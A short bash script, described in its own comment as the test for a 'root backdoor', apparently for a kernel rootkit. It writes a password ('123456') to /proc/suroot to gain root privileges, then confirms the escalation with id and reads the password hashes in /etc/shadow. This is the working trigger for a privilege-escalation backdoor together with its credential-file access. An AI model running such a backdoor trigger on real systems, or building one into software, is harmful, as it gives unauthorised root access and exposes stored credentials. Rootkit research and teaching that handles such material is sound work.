#!/usr/bin/env bash
# The testing script for the root backdoor functionality.

id && \
    file /etc/shadow # We can't read because we are not root.

printf '%s' a_wrong_try > /proc/suroot && \
    id && \
    printf '%s' '123456' > /proc/suroot && \
    id && \
    cat /etc/shadow  # We can read we are now root!
